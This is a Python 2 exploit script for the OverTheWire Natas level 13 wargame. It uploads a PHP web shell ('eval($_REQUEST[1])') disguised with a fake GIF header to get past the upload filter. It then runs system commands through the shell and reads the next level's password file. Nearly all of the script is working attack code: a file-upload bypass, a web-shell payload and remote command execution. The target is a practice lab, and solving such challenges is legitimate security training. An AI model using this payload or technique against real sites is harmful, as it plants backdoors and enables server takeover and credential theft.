#!/usr/bin/python
# coding: utf-8
from requests.auth import HTTPBasicAuth
import requests
import sys
import re

def remove_str(the_string):
    return the_string.replace("GIF29a", "")

def exploit(level13pass):
    print "{+} Natas Level 13. Doing magic..."
    try:
        files = {"uploadedfile": "GIF29a<?php eval($_REQUEST[1]);"}
        data = {"filename": "hax.php"}
        r = requests.post(url="http://natas13.natas.labs.overthewire.org/", auth=HTTPBasicAuth('natas13', level13pass), files=files, data=data)
    except Exception:
        print "{-} Something fucked up, request failed. Bailing. Maybe your password was wrong?"
        return None
    shell_path = re.findall("The file <a href=\"(.*?)\"", r.text)
    shell_path = shell_path[0]
    try:
         data = {"1": "system('id;uname -a;whoami;pwd');"}
         r = requests.post(url="http://natas13.natas.labs.overthewire.org/%s" %(shell_path), auth=HTTPBasicAuth('natas13', level13pass), data=data)
    except Exception,e:
        print "{-} Something fucked up, request failed. Bailing. Maybe your password was wrong?"
        print e
        return None
    print remove_str(r.text)
    try:
         data = {"1": "system('cat /etc/natas_webpass/natas14');"}
         r = requests.post(url="http://natas13.natas.labs.overthewire.org/%s" %(shell_path), auth=HTTPBasicAuth('natas13', level13pass), data=data)
    except Exception,e:
        print "{-} Something fucked up, request failed. Bailing. Maybe your password was wrong?"
        print e
        return None
    return remove_str(r.text.strip())
    #return None

def main(args):
    if len(args) != 2:
        sys.exit("use: %s level13password" %(args[0]))
    level14pass = exploit(args[1])
    if level14pass != None:
        print "{$$} Level 14 Password is: %s" %(level14pass)

if __name__ == "__main__":
    main(args=sys.argv)
